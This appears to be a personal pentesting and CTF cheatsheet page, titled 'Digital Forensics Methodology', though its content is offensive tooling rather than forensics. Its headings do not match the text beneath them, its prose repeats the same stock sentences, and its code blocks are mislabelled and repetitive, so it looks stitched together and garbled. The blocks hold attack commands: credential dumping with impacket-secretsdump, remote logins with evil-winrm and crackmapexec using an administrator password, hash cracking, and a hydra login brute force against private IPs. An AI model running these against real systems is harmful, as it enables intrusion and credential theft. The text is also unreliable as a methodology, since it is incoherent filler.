---
TitleSEO: "Digital Forensics Methodology | ZureFX"
TitlePost: "Digital Forensics Methodology"
Author: "ZureFX"
Description: "Personal notes on Digital Forensics Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, networking, malware, enumeration, oscp, cheatsheet"
URL: "https://zurefx.github.io/notes/note-digital-forensics-methodology-366.html"
URL_IMAGES: ""
Date: "2025-08-31"
Tags: "Lateral Movement, Networking, Malware, Enumeration, OSCP, Cheatsheet"
Section: "notes"
Lang: "en"
main_img: "note-digital-forensics-methodology-366"
Permalink: "/notes/note-digital-forensics-methodology-366.html"
BtnLabel: "Read Notes"
Pick: 0
---
## GetNPUsers

### SMTP

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

> **Note:** Unquoted Service Path was identified as the primary attack vector in this scenario.

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.184.95
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.50.121
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.241.103
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

## Ruby on Rails

### Weak Service Permissions

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality.

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

> **Note:** Open Redirect was identified as the primary attack vector in this scenario.

## Spring

### netcat

- `john`
- `SQL Injection`
- `GPP Password`
- `ffuf`
- `wpscan`

```powershell
feroxbuster -h
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p464,1521,464 10.129.171.50 -oN scan.txt
```

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target.

## SQL Injection

### Django

```bash
nmap -sCV -p3389,636,5986 10.37.171.192 -oN scan.txt
evil-winrm -i 10.107.249.118 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
gobuster dir -u http://10.116.137.224/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.104.184/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.26.184.174/FUZZ
```

## secretsdump

### SSH

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.98.177.9 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.30.215.240 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.114.120.204/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.127.38
gobuster dir -u http://10.32.121.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.53.89.223/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.108.116.80/FUZZ
```

## Constrained Delegation

### Redis

- `GPP Password`
- `DLL Hijacking`
- `bloodhound`

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.22.52.217
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.120.154.188 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```
